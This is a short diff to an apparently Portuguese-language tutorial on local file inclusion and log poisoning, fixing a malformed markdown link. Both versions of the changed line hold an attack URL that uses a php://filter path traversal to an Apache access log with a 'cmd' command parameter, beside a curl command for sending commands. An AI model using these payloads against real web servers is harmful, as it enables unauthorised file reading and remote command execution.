@@ -128,7 +128,7 @@ Depois basta executar o comando via Browser ou Curl
 
 `curl http://adress -d 'parametro=comando'`
 ou
-`http://teste.com/?view=php://filter/convert.base64-encode/resource=../../../..//var/log/apache/access.log&](http://teste.com/?view=php://filter/convert.base64-encode/resource=../../../..//var/log/apache/access.log&)cmd=COMANDO`
+`http://teste.com/?view=php://filter/convert.base64-encode/resource=../../../..//var/log/apache/access.log&cmd=COMANDO`
 
 ![dog](https://miro.medium.com/max/700/1*xeRBVK28Z2H6UVajZyQtsg.png)
 
